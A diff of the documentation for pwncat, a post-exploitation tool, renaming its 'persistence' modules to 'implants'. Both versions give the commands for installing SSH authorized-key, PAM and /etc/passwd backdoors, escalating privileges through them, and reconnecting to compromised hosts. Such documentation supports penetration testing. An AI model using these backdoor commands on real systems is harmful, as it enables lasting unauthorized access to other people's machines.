@@ -1,81 +1,67 @@
-Persistence
-===========
+Persistent Implants
+===================
 
-Persistence modules are implemented as sub-classes of the standard ``pwncat`` modules, and are placed
-under the ``persist`` package. Persistence methods provide an abstract way to install and utilize various
-persistence methods on the victim host.
+pwncat provides the ability to install and manage persistent implants on target hosts. The ``implant``
+module provides a way to manage installed implants. Installing an individual implant is accomplished by
+simply executing the implant module itself.
 
-An installed persistence method is tracked in the database, and can be utilized for escalation or
-reconnecting to a disconnected victim depending on the persistence module itself.
+Installing An Implant
+---------------------
 
-Listing Installed Modules
--------------------------
-
-The ``persist.gather`` module is used to gather the installed modules on the victim host. This module
-is also used to remove persistence modules in bulk. To simply list all installed modules:
+pwncat comes with a few standard implants. Installing the standard implants can be accomplished easily
+as seen below.
 
 .. code-block:: bash
 
-   (local) pwncat$ run persist.gather
+   # Install an authorized public key as the current user
+   (local) pwncat$ run implant.authorized_key key=./id_rsa
+   # Install an authorized key as another user (requires root access)
+   (local) pwncat$ run implant.authorized_key user=john key=./id_rsa
+   # Install a pam backdoor module
+   (local) pwncat$ run implant.pam password=s3cr3ts
+   # Install a backdoor user within /etc/passwd
+   (local) pwncat$ run implant.passwd backdoor_user=pwncat backdoor_pass=pwncat
 
-You can also specify any arguments available to persistence modules in the call to ``run`` in order
-to filter the results:
+List Installed Implants
+-----------------------
 
-.. code-block:: bash
-
-   (local) pwncat$ run persist.gather user=bob
-
-Installing Persistence
-----------------------
-
-Persistence modules are installed by running the relevant module. For example, to install persistence
-as the user ``bob`` with the ``persist.authorized_key`` module, you can do the following:
-
-.. code-block:: bash
-
-   (local) pwncat$ run persist.authorized_key user=bob backdoor_key=./backdoor_id_rsa
-
-Removing Persistence
---------------------
-
-To remove a persistence module, you simply pass the ``remove`` argument to the module. It's worth noting
-that the module arguments must be identical to the installed module in order to successfully remove the
-module. To simplify this, you can use the ``persist.gather`` module to locate and remove the module.
+The generic ``implant`` module can be used to list installed implants.
 
 .. code-block:: bash
 
-   # Remove the module by explicitly specifying all parameters
-   (local) pwncat$ run persist.authorized_key remove user=bob backdoor_key=./backdoor_id_rsa
-   # Remove the module by locating it with persist.gather and removing it
-   (local) pwncat$ run persist.gather remove user=bob
+   # List installed implants
+   (local) pwncat$ run implant list
+   # The default subcommand is to list
+   (local) pwncat$ run implant
 
-Escalating Using Persistence
+Escalate Using Local Implant
 ----------------------------
 
-Escalation with installed persistence can be done by passing the ``escalate`` argument to the
-persistence module. Alternatively, it is recommended to simply utilize the ``escalate.auto``
-module which will automatically select appropriate persistence modules if available.
+The generic ``implant`` module provides the capability to utilize local implants to escalate privileges
+to another user. This can be used to utilize an explicit escalation vice performing automated escalation
+via the ``escalate`` command. During execution of the ``implant escalate`` subcommand, you will be
+prompted for the implants to utilize.
 
 .. code-block:: bash
 
-   # Escalate to bob via installed persistence
-   (local) pwncat$ run persist.authorized_key escalate user=bob backdoor_key=./backdoor_id_rsa
-   (local) pwncat$ run persist.gather escalate user=bob
-   # Recommended method
-   (local) pwncat$ run escalate.auto user=bob
+   # Attempt escalation with a local implant; will be prompted for which implant(s) to use
+   (local) pwncat$ run implant escalate
 
-Reconnecting to a Victim via Persistence
-----------------------------------------
+Removing Implants
+-----------------
 
-Remote persistence modules can be used to reconnect to a victim host. This is done with the ``connect``
-command (or via the pwncat command line parameters). The ``reconnect`` protocol will achieve this:
+Once again, the ``implant`` module provides the ability to remove installed implants. As with the escalate
+subcommand, you will be prompted for which implant to remove after running the module.
 
 .. code-block:: bash
 
-   # Reconnect as the specified user.
-   # Automatically select either an installed persistence method or prompt for ssh password
-   pwncat user@192.168.1.1
-   # Reconnect protocol explicitly
-   pwncat reconnect://user@192.168.1.1
-   # Reconnect with a specific module
-   pwncat reconnect://user:persist.authorized_key@192.168.1.1
+   # Remove one or more implants
+   (local) pwncat$ run implant remove
+
+Reconnecting With Implants
+--------------------------
+
+Remote implants provide a way to reconnect to a target at will. Reconnecting can be accomplished by simply
+executing the pwncat entrypoint and specifying either the IP address or unique host ID of the target.
+pwncat will automatically check for installed implants and attempt to reconnect. See the Usage section for
+examples.
